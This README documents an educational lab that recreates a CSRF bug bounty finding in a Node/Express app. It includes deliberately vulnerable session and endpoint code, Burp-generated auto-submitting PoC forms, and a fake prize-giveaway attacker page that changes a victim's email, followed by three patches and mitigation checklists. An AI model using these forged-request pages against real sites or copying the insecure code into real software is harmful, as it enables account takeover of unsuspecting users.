# 🔐 CSRF Vulnerability — $700 Bug Bounty Recreation

> A hands-on recreation of a real-world Cross-Site Request Forgery vulnerability found on a live target, triaged at **$700**, built from scratch to demonstrate the full attack lifecycle — discovery, exploitation, and patch.

---

## 📋 Table of Contents

- [What is CSRF?](#what-is-csrf)
- [How Does CSRF Work?](#how-does-csrf-work)
- [What Causes CSRF?](#what-causes-csrf)
- [How Was This Vulnerability Found?](#how-was-this-vulnerability-found)
- [The Vulnerable Code](#the-vulnerable-code)
- [Exploitation — How the Attack Works](#exploitation--how-the-attack-works)
- [Proof of Concept](#proof-of-concept)
- [Impact](#impact)
- [The Fix — How We Patched It](#the-fix--how-we-patched-it)
- [Mitigation Checklist](#mitigation-checklist)
- [Running This Lab](#running-this-lab)
- [Disclaimer](#disclaimer)

---

## What is CSRF?

**Cross-Site Request Forgery (CSRF)** is a web security vulnerability that tricks an authenticated user into unknowingly submitting a malicious request to a web application they are already logged into.

The attack abuses the trust a web server has in a user's browser. Because browsers automatically attach cookies (including session cookies) to every request made to a domain, an attacker can craft a request from an entirely different website and the server will process it as if the victim sent it themselves.

```
Victim is logged in to bank.com
        │
Attacker sends victim a link → evil.com
        │
evil.com has a hidden form targeting bank.com/transfer
        │
Victim's browser fires the request + attaches bank.com session cookie automatically
        │
bank.com sees valid session → processes the transfer
        │
Victim's money is gone — they never clicked anything on bank.com
```

CSRF is listed in the **OWASP Top 10** (A01 — Broken Access Control family) and has been responsible for real-world account takeovers, unauthorized transactions, and data manipulation across thousands of applications.

---

## How Does CSRF Work?

CSRF exploits two fundamental browser behaviors:

### 1. Cookies are sent automatically
When your browser makes any request to `example.com` — whether it originates from `example.com` itself or from `evil.com` — it attaches all cookies stored for `example.com`. The server cannot tell the difference just by looking at the cookie.

### 2. HTML forms can target any domain
A `<form>` tag on `evil.com` can have its `action` attribute point to `bank.com/transfer`. When submitted, the browser sends the request to `bank.com` with the victim's cookies attached — no JavaScript required.

### The Attack Flow

```
┌─────────────┐        ① Victim logs in        ┌──────────────────┐
│   Victim    │ ─────────────────────────────► │  Legitimate Site  │
│  (Browser)  │ ◄───────────────────────────── │  (localhost:3000) │
└─────────────┘   ② Session cookie issued       └──────────────────┘
       │
       │  ③ Victim visits attacker page (different tab/link)
       ▼
┌─────────────────┐
│  Attacker Page  │  Hidden form:
│  (evil.com)     │  <form action="http://localhost:3000/profile/update">
│                 │    <input name="email" value="hacked@evil.com">
└────────┬────────┘  </form>
         │
         │  ④ Form auto-submits → browser attaches victim's cookie
         ▼
┌──────────────────┐
│  Legitimate Site │  Sees: valid session ✅ + malicious data
│  (localhost:3000)│  Does: updates profile with attacker's values
└──────────────────┘
         │
         ▼
    Victim's account is changed
    without their knowledge ✅ (for attacker)
```

---

## What Causes CSRF?

CSRF vulnerabilities exist because of **missing or incorrect server-side validation of request origin**. Specifically, one or more of the following conditions are present:

| Root Cause | Description |
|---|---|
| **No CSRF Token** | The server does not generate and validate a secret per-session token in forms. Any request with a valid cookie is trusted. |
| **Missing `SameSite` cookie attribute** | Without `SameSite=Strict` or `SameSite=Lax`, browsers send the session cookie on all cross-origin requests — including forged ones. |
| **No Origin / Referer validation** | The server never checks where the request came from. A POST from `evil.com` and a POST from the legitimate page look identical. |
| **State-changing actions via GET** | Using GET requests for actions like `/delete?id=5` makes CSRF trivial — attackers can use a simple `<img src="...">` tag. |
| **Overly permissive CORS** | Setting `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` allows cross-origin reads, compounding the issue. |

In this recreation, **all three of the first causes** were present simultaneously.

---

## How Was This Vulnerability Found?

### Reconnaissance
While testing a target's profile management functionality, the update profile form was identified as a target of interest because it modified account details (email, bio, phone) — a high-value state-changing action.

### Observation
Intercepting the profile update request in **Burp Suite** revealed:

```http
POST /profile/update HTTP/1.1
Host: target.com
Cookie: connect.sid=s%3Aabc123xyz...
Content-Type: application/x-www-form-urlencoded

email=alice%40example.com&bio=Hello&phone=%2B15550100
```

Two things stood out immediately:
1. **No CSRF token** anywhere in the request body or headers
2. **No `SameSite` attribute** on the session cookie (visible in the `Set-Cookie` response header during login)

### Validation
To confirm the vulnerability, the following steps were taken:

**Step 1 — Check the Set-Cookie header during login**
```http
HTTP/1.1 200 OK
Set-Cookie: connect.sid=abc123; HttpOnly
# ← No SameSite attribute. Vulnerable.
```

**Step 2 — Inspect the form source**
```html
<form method="POST" action="/profile/update">
  <input type="email" name="email" />
  <input type="text"  name="bio"   />
  <!-- ← No hidden _csrf token field. Vulnerable. -->
</form>
```

**Step 3 — Use Burp's CSRF PoC generator**
Right-click the captured request → `Engagement Tools` → `Generate CSRF PoC`. Burp generated a working HTML page that replicated the request. Opening this page in the same browser session while logged in successfully changed the account details — **confirming the vulnerability**.

### Burp PoC Generated
```html
<html>
  <body>
    <form action="https://target.com/profile/update" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="bio"   value="Hacked via CSRF" />
      <input type="submit" value="Submit" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

---

## The Vulnerable Code

### The Session — Missing `SameSite`
```js
// ❌ VULNERABLE
app.use(session({
  secret: "secret",
  cookie: {
    httpOnly: true,
    // SameSite not set → browser sends cookie on ALL cross-origin requests
  },
}));
```

### The Endpoint — No Token Check
```js
// ❌ VULNERABLE
app.post("/profile/update", (req, res) => {
  if (!req.session.user) return res.status(401).send("Not logged in");

  // Only checks if session exists — never validates WHERE the request came from
  // Never checks for a CSRF token
  // Never checks Origin / Referer headers
  
  users[req.session.user].email = req.body.email;
  users[req.session.user].bio   = req.body.bio;
  
  res.json({ success: true });
});
```

### The Form — No Token
```html
<!-- ❌ VULNERABLE -->
<form method="POST" action="/profile/update">
  <input type="email" name="email" />
  <input type="text"  name="bio"   />
  <!-- No hidden _csrf field -->
</form>
```

---

## Exploitation — How the Attack Works

### The Attacker's Page
```html
<!-- Looks like a prize giveaway page to the victim -->
<h2>🎉 You Won a Free iPhone! Click to claim.</h2>
<button onclick="claim()">Claim Now</button>

<!-- Hidden form — victim never sees this -->
<form id="csrf-form"
      action="http://localhost:3000/profile/update"
      method="POST"
      style="display:none">
  <input type="hidden" name="email" value="hacked@attacker.com" />
  <input type="hidden" name="bio"   value="Account compromised via CSRF" />
</form>

<script>
  function claim() {
    // Victim clicks button thinking they're claiming a prize
    // Actually fires a forged POST to the legitimate server
    document.getElementById("csrf-form").submit();
  }
</script>
```

### Why the Server Accepts It
```
Victim's browser sends:

POST /profile/update HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=<valid-session>    ← browser attached this automatically
Content-Type: application/x-www-form-urlencoded

email=hacked%40attacker.com&bio=Account+compromised
                                       ↑
                             No _csrf token in body
                             Server doesn't check for one
                             So it just... processes it ✅
```

---

## Proof of Concept

### Steps to Reproduce
1. Start the vulnerable server: `node server.js` (runs on port 3000)
2. Log in at `http://localhost:3000` with `alice / password123`
3. Note the current email: `alice@example.com`
4. In the **same browser**, open `http://localhost:3000/attacker` (or load the Burp PoC HTML)
5. Click the button
6. Navigate back to `http://localhost:3000/profile`
7. The email and bio have been changed to attacker-controlled values

### Expected vs Actual Behavior

| | Expected | Actual |
|---|---|---|
| **Request origin** | Server should reject cross-origin POST | Server accepted it |
| **CSRF token** | Server should require a valid token | No token was required |
| **Outcome** | Profile unchanged | Profile silently modified |

---

## Impact

This vulnerability allows an attacker to perform **any state-changing action** on behalf of an authenticated victim without their knowledge or consent. In the context of this application:

- **Account takeover (partial)** — Change victim's email to attacker's email, then use "Forgot Password" to gain full control
- **Profile defacement** — Inject malicious content into bio fields
- **Chained attacks** — If email is changed and used for 2FA recovery, full account takeover is possible
- **No user interaction required** — Attack works silently on page load; victim only needs to visit the attacker's link while logged in

### CVSS Score (Estimated)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
Base Score: 6.5 (Medium) → escalates to High when chained with account takeover
```

### Bug Bounty
This class of vulnerability was rewarded at **$700** on the target program, classified under **Broken Access Control / CSRF** affecting a high-value user action.

---

## The Fix — How We Patched It

Three independent layers of defence were added. Each one alone would stop the attack — together they make CSRF exploitation practically impossible.

### Fix 1 — `SameSite=Strict` Cookie
```js
// ✅ PATCHED
app.use(session({
  secret: "secret",
  cookie: {
    httpOnly: true,
    sameSite: "strict",  // Browser will NOT attach this cookie to any cross-origin request
  },
}));
```
**Why it works:** With `SameSite=Strict`, the browser simply refuses to attach the session cookie when the request originates from a different site. The forged request arrives with no cookie → server sees it as unauthenticated → 401.

---

### Fix 2 — Origin / Referer Header Validation
```js
// ✅ PATCHED
function validateOrigin(req, res) {
  const host          = req.headers.host;
  const origin        = req.headers["origin"];
  const referer       = req.headers["referer"];
  const allowedOrigin = `${req.protocol}://${host}`;

  if (origin && origin !== allowedOrigin) {
    res.status(403).json({ error: "CSRF blocked", reason: "Origin mismatch" });
    return false;
  }
  if (!origin && referer && !referer.startsWith(allowedOrigin + "/")) {
    res.status(403).json({ error: "CSRF blocked", reason: "Referer mismatch" });
    return false;
  }
  return true;
}
```
**Why it works:** Browsers always include an `Origin` header on cross-origin POST requests and they cannot be spoofed by JavaScript. A request from `evil.com` will have `Origin: http://evil.com` which fails the check → 403.

---

### Fix 3 — CSRF Token (Synchronizer Token Pattern)
```js
// ✅ PATCHED — Server generates token at login and on every page load
const token = crypto.randomBytes(32).toString("hex");
req.session.csrfToken = token;

// Injected into the HTML form as a hidden field
<input type="hidden" name="_csrf" value="${csrfToken}" />

// Validated on POST using timing-safe comparison
app.post("/profile/update", (req, res) => {
  const a = Buffer.from(req.body._csrf,        "utf8");
  const b = Buffer.from(req.session.csrfToken, "utf8");

  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    return res.status(403).json({ error: "CSRF blocked", reason: "Token mismatch" });
  }
  // Safe to proceed
});
```
**Why it works:** The token is a cryptographically random secret embedded in the page. The attacker's page on a different origin **cannot read it** (Same-Origin Policy). Any forged POST will either omit the token or include the wrong one → 403.

---

### What Each Attack Attempt Hits Now

| Attempt | Blocked by | HTTP Response |
|---|---|---|
| Cross-origin form POST | `SameSite=Strict` | Cookie not sent → `401` |
| POST from different Origin | Origin validation | `403 Origin mismatch` |
| POST with no CSRF token | Token check | `403 CSRF token missing` |
| POST with wrong/old token | Token check | `403 CSRF token does not match` |
| Burp PoC replay | All three layers | Fails at first check |

---

## Mitigation Checklist

Use this checklist when auditing or building any web application:

### For Developers
- [ ] Set `SameSite=Strict` or `SameSite=Lax` on all session cookies
- [ ] Generate a cryptographically random CSRF token per session (min 32 bytes)
- [ ] Embed the token as a hidden field in every state-changing HTML form
- [ ] Validate the token server-side on every `POST`, `PUT`, `PATCH`, `DELETE` request
- [ ] Use `crypto.timingSafeEqual` (or equivalent) for token comparison to prevent timing attacks
- [ ] Validate the `Origin` header on all state-changing requests
- [ ] Fall back to `Referer` header validation when `Origin` is absent
- [ ] Regenerate the session ID on login (`req.session.regenerate()`) to prevent session fixation
- [ ] Rotate the CSRF token after each successful state-changing request
- [ ] Never use GET requests for state-changing operations (delete, update, transfer)
- [ ] Set `HttpOnly` and `Secure` flags on all session cookies

### For Bug Bounty Hunters
- [ ] Intercept all profile / account update requests in Burp Suite
- [ ] Check `Set-Cookie` response headers — is `SameSite` present?
- [ ] Inspect form HTML source — is there a hidden `_csrf` or `token` field?
- [ ] Use Burp's **Generate CSRF PoC** (`Right-click → Engagement Tools`) to auto-generate a test
- [ ] Test the PoC in the same browser session as the logged-in victim
- [ ] Check if the server validates `Origin` / `Referer` — remove them in Burp Repeater and retry
- [ ] Look for high-impact endpoints: email change, password change, payment, delete account
- [ ] Check if JSON endpoints accept `application/x-www-form-urlencoded` (widens attack surface)
- [ ] Chain with email-change to demonstrate full account takeover for higher severity

### Libraries / Middleware to Use
| Platform | Recommended Solution |
|---|---|
| Node.js / Express | `csurf` middleware or manual `crypto.randomBytes` token |
| Django | Built-in `{% csrf_token %}` template tag |
| Laravel | Built-in `@csrf` Blade directive |
| Spring (Java) | Spring Security CSRF protection (enabled by default) |
| ASP.NET | `@Html.AntiForgeryToken()` |
| Ruby on Rails | Built-in `protect_from_forgery` |

---

## Running This Lab

### Prerequisites
- Node.js v14+
- npm

### Setup
```bash
# Clone or download the project
cd CSRF/

# Install dependencies (one package.json covers both files)
npm install

# Run the VULNERABLE version
node server.js       # → http://localhost:3000

# Run the PATCHED version (separate tab)
node patched.js      # → http://localhost:3001
```

### File Structure
```
CSRF/
├── server.js       ← Vulnerable app  (port 3000)
├── patched.js      ← Patched app     (port 3001)
├── package.json    ← Shared dependencies
└── README.md       ← This file
```

### Credentials
```
Username : alice
Password : password123
```

### Attack Steps (Vulnerable — server.js)
1. Login at `http://localhost:3000`
2. Open `http://localhost:3000/attacker` in the same browser
3. Click "Claim Now" and watch the profile get changed

### Verify the Patch (patched.js)
1. Login at `http://localhost:3001`
2. Attempt the same attack — every forged request returns `403`
3. Legitimate profile update from the real form works fine ✅

---

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — CSRF](https://portswigger.net/web-security/csrf)
- [MDN — SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP Top 10 — A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## Disclaimer

> This project is built **strictly for educational purposes** and bug bounty research. The vulnerable application (`server.js`) is intentionally insecure and must only be run in a local, isolated environment. Do not deploy the vulnerable version on any public or production server. Always obtain proper written authorization before testing any application you do not own.

---

<div align="center">
  <sub>Built for educational bug bounty recreation · CSRF $700 Bounty Demo</sub>
</div>
